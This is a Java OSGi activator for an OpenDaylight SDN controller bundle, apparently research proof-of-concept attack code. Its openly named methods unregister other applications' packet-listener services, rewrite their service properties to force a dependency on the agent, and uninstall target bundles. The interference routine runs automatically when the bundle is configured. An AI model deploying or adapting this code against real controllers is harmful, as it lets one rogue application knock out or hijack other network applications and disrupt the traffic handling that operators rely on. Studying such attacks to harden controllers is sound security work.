package com.example.appagent2;

import java.util.Dictionary;
import java.util.Enumeration;
import java.util.Hashtable;
import java.util.List;

import org.apache.felix.dm.Component;
import org.apache.felix.dm.Dependency;
import org.apache.felix.dm.DependencyManager;
import org.opendaylight.controller.clustering.services.ICacheUpdateAware;
import org.opendaylight.controller.hosttracker.hostAware.IHostFinder;
import org.opendaylight.controller.sal.core.ComponentActivatorAbstractBase;
import org.opendaylight.controller.sal.core.ContainerServiceDependency;
import org.opendaylight.controller.sal.flowprogrammer.IFlowProgrammerService;
import org.opendaylight.controller.sal.packet.IDataPacketService;
import org.opendaylight.controller.sal.packet.IListenDataPacket;
import org.opendaylight.controller.switchmanager.ISwitchManager;
import org.osgi.framework.Bundle;
import org.osgi.framework.BundleContext;
import org.osgi.framework.BundleException;
import org.osgi.framework.ServiceReference;
import org.osgi.framework.ServiceRegistration;
import org.slf4j.Logger;
import org.slf4j.LoggerFactory;

public class Activator extends ComponentActivatorAbstractBase {

	private Component c;
	private Object imp;
	private String containerName;
	private Communication cm;

	protected static final Logger logger = LoggerFactory
			.getLogger(Activator.class);

	public void init() {
//		connectManager();
		System.out.println("Activator.init()");
	}

	public void connectManager() {
		cm = new Communication();
		cm.setServerAddr("127.0.0.1", 3366);
		cm.setActivator(this);
		cm.connectServer("AppAgent2");
		cm.start();
	}
	
	public void destroy() {
		System.out.println("Activator.destroy()");
	}

	public Object[] getImplementations() {
		Object[] res = { AppAgent2.class };
		return res;
	}

	public boolean Service_Unregstration_Attack() {
		List<ContainerServiceDependency> list = this.c.getDependencies();

		DependencyManager manager = this.c.getDependencyManager();
		List<DependencyManager> dlist = manager.getDependencyManagers();
		BundleContext ctx = manager.getBundleContext();
		Bundle[] blist = ctx.getBundles();

		for (int i = 0; i < dlist.size(); i++) {
			DependencyManager dm = dlist.get(i);
			List<Component> temp = dm.getComponents();
			
			for (int j = 0; j < temp.size(); j++) {
				Component ct = temp.get(j);
				@SuppressWarnings("unchecked")
				Dictionary<String, Object> props = ct.getServiceProperties();
				if (props != null) {
					Object res = props.get("salListenerName"); // salListenerName
					if (res != null) {
						// ct.setServiceProperties(props_new);
						ServiceRegistration sr = ct.getServiceRegistration();
						ServiceReference sr2 = sr.getReference();

						Bundle bd = sr2.getBundle();
						System.out.println("unregister service: "+bd.getSymbolicName());

						/* service unregister */
						sr.unregister();
						
						List<Dependency> dpl = ct.getDependencies();
						for (int k = 0; k < dpl.size(); k++) {
							Dependency dp = dpl.get(k);
							ct.remove(dp);
						}
						
						return true;
					}
				}
			}
		}		
		return false;
	}

	public void Service_Chain_Interference() {
		
		try {
			Thread.sleep(5000);
		} catch (InterruptedException e) {
			// TODO Auto-generated catch block
			e.printStackTrace();
		}
		
		List<ContainerServiceDependency> list = this.c.getDependencies();

		DependencyManager manager = this.c.getDependencyManager();
		List<DependencyManager> dlist = manager.getDependencyManagers();
		BundleContext ctx = manager.getBundleContext();
		
		Bundle[] blist = ctx.getBundles();

		for (int i = 0; i < dlist.size(); i++) {
			DependencyManager dm = dlist.get(i);
			List<Component> temp = dm.getComponents();
			// System.out.println("Componenets Size :" + temp.size());
			for (int j = 0; j < temp.size(); j++) {
				Component ct = temp.get(j);

				@SuppressWarnings("unchecked")
				Dictionary<String, Object> props = ct.getServiceProperties();
				if (props != null) {
					Object res = props.get("salListenerName"); // salListenerName
					if (res != null) {
						if (!((String) res).contains("appagent")) {
							Dictionary<String, Object> props_new = new Hashtable<String, Object>();
							Enumeration<String> keys = props.keys();
							while (keys.hasMoreElements()) {
								String key = keys.nextElement();
								props_new.put(key, props.get(key));
							}
							props_new.put("salListenerDependency", "appagent");
							ct.stop();
							ct.setServiceProperties(props_new);
							ct.start();
						} else {
							
						}
					}
				}
			}
		}
	}

	public boolean Application_Eviction(String target) {
		DependencyManager manager = this.c.getDependencyManager();
		BundleContext ctx = manager.getBundleContext();
		Bundle[] blist = ctx.getBundles();

		for (int i = 0; i < blist.length; i++) {
			Bundle bd = blist[i];
			String bdName = bd.getSymbolicName();
			if (bdName.contains(target)) {
				System.out.println(bd.getBundleId()+":"+bdName);
				try {
					bd.uninstall();
				} catch (BundleException e) {
					// TODO Auto-generated catch block
					e.printStackTrace();
					return false;
				}
				return true;
			}
		}
		return false;
	}

	public void configureInstance(Component c, Object imp, String containerName) {
		if (imp.equals(AppAgent2.class)) {
			// export the service
			Dictionary<String, String> props = new Hashtable<String, String>();
			props.put("salListenerName", "appagent2");

			c.setInterface(new String[] { IListenDataPacket.class.getName() },
					props);

			c.add(createContainerServiceDependency(containerName)
					.setService(ISwitchManager.class)
					.setCallbacks("setSwitchManager", "unsetSwitchManager")
					.setRequired(true));

			c.add(createContainerServiceDependency(containerName)
					.setService(IDataPacketService.class)
					.setCallbacks("setDataPacketService",
							"unsetDataPacketService").setRequired(true));

			c.add(createContainerServiceDependency(containerName)
					.setService(IFlowProgrammerService.class)
					.setCallbacks("setFlowProgrammerService",
							"unsetFlowProgrammerService").setRequired(true));

			this.c = c;
			this.imp = imp;
			this.containerName = containerName;	
			
			Service_Chain_Interference();
		}
	}
}
